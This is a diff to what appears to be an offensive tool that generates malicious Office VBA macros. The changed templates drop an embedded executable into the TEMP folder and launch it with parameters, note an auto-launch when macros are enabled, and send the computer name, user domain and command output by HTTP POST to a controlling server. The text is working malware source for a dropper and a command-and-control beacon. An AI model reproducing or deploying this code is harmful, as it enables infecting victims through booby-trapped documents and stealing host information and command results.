@@ -345,13 +345,12 @@ EMBED_EXE = \
 r"""
 
 Private Sub executeEmbed()
-
     Dim fileName As String
     fileName = "\<<<FILE_NAME>>>"
     Dim fullPath As String
     fullPath = Environ("TEMP") & fileName
     DumpFile fullPath
-    ExecuteCmdAsync fullPath
+    ExecuteCmdAsync fullPath <<<PARAMETERS>>>
 End Sub
 
 ' Auto launch when VBA enabled
@@ -413,15 +412,18 @@ End Function
 Private Function GetId() As String
     Dim myInfo As String
     Dim myID As String
-    myID = Environ("COMPUTERNAME") & " " & Environ("OS")
-    GetId = myID
+    myID = Environ("COMPUTERNAME") & "(" & Environ("USERDOMAIN")
+    myInfo = myID & ")"
+    GetId = myInfo
 End Function
 
 'To send response for command'
 Private Function SendResponse(cmdOutput)
     Dim data As String
     Dim response As String
-    data = "id=" & GetId  & "&cmdOutput=" & cmdOutput
+    Dim hostId As String
+    hostId = GetId()
+    data = "id=" &  hostId &  "&cmdOutput=" & cmdOutput
     SendResponse = HttpPostData(serverUrl, data)
 End Function
 
